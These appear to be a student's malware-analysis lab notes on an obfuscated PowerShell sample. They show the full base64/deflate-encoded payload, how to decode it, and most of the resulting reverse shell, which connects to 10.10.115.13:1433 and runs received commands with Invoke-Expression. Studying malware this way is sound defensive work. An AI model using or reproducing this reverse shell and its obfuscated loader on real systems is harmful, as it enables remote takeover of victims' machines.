In this section we will study:
- `PMAT-labs/labs/3-3.OffScript-ScriptMalware/PowerShell/Malware.PSObfusc.ps1.malz.7z` 

Powershell is very used for malwares because it can allow the execution of scripts with windows built-ins. So we can run API calls and, run maliciosu scripts on the system.

# Studying the file 

We rename it into `.ps1`:
- ![[Pasted image 20250211170817.png]]

And we open it with Visual studio code (`click on view` -> `Word wrap`):
- ![[Pasted image 20250211170927.png]]

We can see it is obfuscates and it uses upper and lower letter (this because powershell allows the execution also non case-sensitive)

`iex` is `invoke expression` and inside it we have the script

1. In this case we are converting from base64 this string:
```text
tVVpbxMxEP2cSv0PVhqhRLAm6cVRgVTSg0q91EScQsi7mSSmjr14vWlLyX/H115JKEUUJ9pj5s2befbYu7b2MKO+s7qyhh5k3M11Lq5A9sbAGLqAKcgEUL97jqYbeOuvuRZHeIOOpoSjHuURXP4b113Dcx1S9TYNkYRYJFQJeYOIQiOqxmmIIzF5SnUtQWJreRob4YkRHkgnPFBRjHOuAwCGhhIAKYEGghMFKKQqEpQb1s4b+elku//s8MXF6fNpSEI+/JBunmwfx6Mf6vv2x84m/i8aH2oYMvNrRIwCV+gVavCUMW1tJEoCmZQtYTocgixbriRVVcuAKFJ+l5CkrMyr9HLcrq4YKQ0aa0e908bm39nCnY2698RCmqDO5sbG6kqtqO4UroKz8BtESj8q3BPRJagE96O4ayFNzfnEhbd2TGShwnHgQ1A9a2s6QC6qRP3mRsHnL6jTXt+0GOCRGFA+qqL6cK3wbhJRuu/9FpzPSQl6dIZd0vfW2fRltUoBeDdV4oClydgUq2QKrjxdSqItbfM2EGbqanmIZWvWz3uv65YqBxRxPhO+ADJoerFPUFvPkXvGx8BHauzCa3SImj40GCnUbnm6Wr6u9v4Y5VPi51M/zbEbEs86M9cZuhpTBijTjvc00+6UUEZCBg75u/SV7LgvqV88H2GtTsdc2b7ZalZC3opHfCouIdi/jrUpoYKjoCsmE8IHXt/660cd9BOdpSpw2lwyrSEiKhovoWx8xfvXEcTKsC2LdLcuAyKDd0RSIxoFp2QCqG5y1j2wwZwOTenIvTDvtnrZMql6k4jU7pG2xxbdsBAI88uPblHRMhXXDpohYPp7UEawzJXRVzsyKz1Jw8T3hi0u74vWTh7oqn78yrsKR1bsvKdopMo8ZO7lU+wKqldWw7WlvhSM5d7T2PJ6V5YYH3EOsng90X1ERmBDhpQTxlzf2Vn3B0LAwR2Creom7jKRgO/nzLZHk7iwLpfkoFbSLEvlT7uFVH7LVVJl2/AeqRy0msofyQup/DFbSeVt90nloNVU/oheSOX71BLdSeqAVVK/dedJ/9g+OYE9Ke4Xnm9wE/y5d5MomODD7peXL7uCMf2BsNXPfgE=
```
2. we are decompressing the result with deflate:
```powershell
Io.CoMpRESSiOn.defLaTEstReam([iO.memoRYStREam]... ,[sYsTem.io.comprEsSIOn.CoMPReSsIONmOdE]::dEcOMpresS)
```
3. we convert the result in text:
```powershell
New-Object System.Io.StreamReader($_,[SysTEm.TExT.eNCoDIng]::aSCIi)
```
4. We execute the obtained script
```powershell
$_.reaDtoEnD()
```



We can try to study it in powershell:
1. we remove the first part `iEx(` and the final `)`
2. we assign it to a variable

```powershell
$megaSus = nEW-ObJECt Â Io.CoMpRESSiOn.defLaTEstReam([iO.memoRYStREam][sYsteM.coNvert]::FROmbaSe64StRiNG( 'tVVpbxMxEP2cSv0PVhqhRLAm6cVRgVTSg0q91EScQsi7mSSmjr14vWlLyX/H115JKEUUJ9pj5s2befbYu7b2MKO+s7qyhh5k3M11Lq5A9sbAGLqAKcgEUL97jqYbeOuvuRZHeIOOpoSjHuURXP4b113Dcx1S9TYNkYRYJFQJeYOIQiOqxmmIIzF5SnUtQWJreRob4YkRHkgnPFBRjHOuAwCGhhIAKYEGghMFKKQqEpQb1s4b+elku//s8MXF6fNpSEI+/JBunmwfx6Mf6vv2x84m/i8aH2oYMvNrRIwCV+gVavCUMW1tJEoCmZQtYTocgixbriRVVcuAKFJ+l5CkrMyr9HLcrq4YKQ0aa0e908bm39nCnY2698RCmqDO5sbG6kqtqO4UroKz8BtESj8q3BPRJagE96O4ayFNzfnEhbd2TGShwnHgQ1A9a2s6QC6qRP3mRsHnL6jTXt+0GOCRGFA+qqL6cK3wbhJRuu/9FpzPSQl6dIZd0vfW2fRltUoBeDdV4oClydgUq2QKrjxdSqItbfM2EGbqanmIZWvWz3uv65YqBxRxPhO+ADJoerFPUFvPkXvGx8BHauzCa3SImj40GCnUbnm6Wr6u9v4Y5VPi51M/zbEbEs86M9cZuhpTBijTjvc00+6UUEZCBg75u/SV7LgvqV88H2GtTsdc2b7ZalZC3opHfCouIdi/jrUpoYKjoCsmE8IHXt/660cd9BOdpSpw2lwyrSEiKhovoWx8xfvXEcTKsC2LdLcuAyKDd0RSIxoFp2QCqG5y1j2wwZwOTenIvTDvtnrZMql6k4jU7pG2xxbdsBAI88uPblHRMhXXDpohYPp7UEawzJXRVzsyKz1Jw8T3hi0u74vWTh7oqn78yrsKR1bsvKdopMo8ZO7lU+wKqldWw7WlvhSM5d7T2PJ6V5YYH3EOsng90X1ERmBDhpQTxlzf2Vn3B0LAwR2Creom7jKRgO/nzLZHk7iwLpfkoFbSLEvlT7uFVH7LVVJl2/AeqRy0msofyQup/DFbSeVt90nloNVU/oheSOX71BLdSeqAVVK/dedJ/9g+OYE9Ke4Xnm9wE/y5d5MomODD7peXL7uCMf2BsNXPfgE=' ), [sYsTem.io.comprEsSIOn.CoMPReSsIONmOdE]::dEcOMpresS) | % {nEW-ObJECt SYsteM.Io.strEAmReAder($_,[SysTEm.TExT.eNCoDIng]::aSCIi) }| % { $_.reaDtoEnD()}
```


Now instead of invoking the expression we print it:
- ![[Pasted image 20250211172236.png]]
- ![[Pasted image 20250211172245.png]]

It implements a reverse shell:
1. IP and server port 
```powershell
$ip = "10.10.115.13" 
$port = 1433
```
1. TCP connection
```powershell
$client = New-Object Net.Sockets.TcpClient($ip, $port);
$stream = $client.GetStream();

```
1. buffer and writer for the connection
```powershell
$buffer = New-Object Byte[] 1024;
$encoding = New-Object Text.AsciiEncoding;
$writer = New-Object IO.StreamWriter($stream);
$writer.AutoFlush = $true;

```
1. Listener for commands
```powershell
do {
    $writer.Write("PS>");
    do {
        $bytes = $stream.Read($buffer, 0, $buffer.Length);
        if ($bytes -gt 0) {
            $data = $data + $encoding.GetString($buffer, 0, $bytes);
        }
    } while ($stream.DataAvailable);

```
1. command exection
```powershell
if ($bytes -gt 0) {
    $data = $data.Trim();
    if ($data.Length -gt 0) {
        try {
            $result = Invoke-Expression -Command $data 2>&1 | Out-String;
        } catch {
            $result = $_.Exception | Out-String;
        }
```
1. Result sending
```powershell
$length = $result.Length;
if ($length -gt 0) {
    $count = 0;
    do {
        if ($length -ge $buffer.Length) { $bytes = $buffer.Length; } else { $bytes = $length; }
        $writer.Write($result.substring($count, $bytes));
        $count += $bytes;
        $length -= $bytes;
    } while ($length -gt 0);
}

```

And so on...
